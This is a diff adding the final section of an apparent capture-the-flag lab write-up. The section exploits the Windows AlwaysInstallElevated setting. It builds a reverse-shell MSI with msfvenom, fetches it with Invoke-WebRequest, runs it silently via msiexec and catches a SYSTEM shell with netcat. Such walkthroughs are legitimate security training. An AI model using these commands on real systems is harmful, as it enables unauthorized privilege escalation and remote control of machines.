@@ -248,7 +248,7 @@
 
 // Running .\WinPEASx64.exe And the most relevant thing we see its [AlwaysInstallElevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated)
 
-    C:\Users\Phoebe\Desktop>.\winPEASx64.exe
+    PS C:\Users\Phoebe\Desktop>.\winPEASx64.exe
     ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
 
                  *((,.,/((((((((((((((((((((/,  */               
@@ -290,12 +290,48 @@
         .......
 
 
-// So. 
+// According to [AlwaysInstallElevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated) if we have 2 enabled registry, then any user can install .msi file as NT/SYSTEM , Lets try this.
+
+// First we will make .msi payload with 'MsfVenom' and call him 'reverse.msi'
+
+    $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.8 LPORT=1447 -f msi -o reverse.msi
+
+// We will upload 'reverse.msi' again with python and powershell
+
+    $ python -m http.server 1447
+-----
+
+    PS C:\Users\Phoebe\Desktop> Invoke-WebRequest http://10.10.17.8:1446/reverse.msi -OutFile C:\Users\Phoebe\Desktop\reverse.msi
+    PS C:\Users\Phoebe\Desktop> dir
+    
+    Directory: C:\Users\Phoebe\Desktop
 
 
+    Mode                 LastWriteTime         Length Name                                                                 
+    ----                 -------------         ------ ----                                                                 
+    d-----          8/3/2021  11:46 PM                tmp                                                                  
+    -a----          8/4/2021  12:38 AM         159744 reverse.msi                                                          
+    -ar---          8/3/2021   4:16 PM             34 user.txt                                                             
+    -a----          8/3/2021  11:55 PM        1919488 winPEASx64.exe                                                       
 
 
+// Open a listiner and run the 'reverse.msi' with following command
 
+    PS C:\Users\Phoebe\Desktop> msiexec /quiet /qn /i reverse.msi
 
+// We got NT/SYSTEM !!!
 
+    $ rlwrap nc -lvnp 1447
+    listening on [any] 1447 ...
+    connect to [10.10.17.8] from (UNKNOWN) [10.10.10.239] 62200
+    Microsoft Windows [Version 10.0.19042.867]
+    (c) 2020 Microsoft Corporation. All rights reserved.
 
+    C:\WINDOWS\system32> whoami
+    whoami
+    nt authority\system
+
+// We got root flag !
+
+    C:\Users\Administrator\Desktop> type root.txt
+    53c137f...................
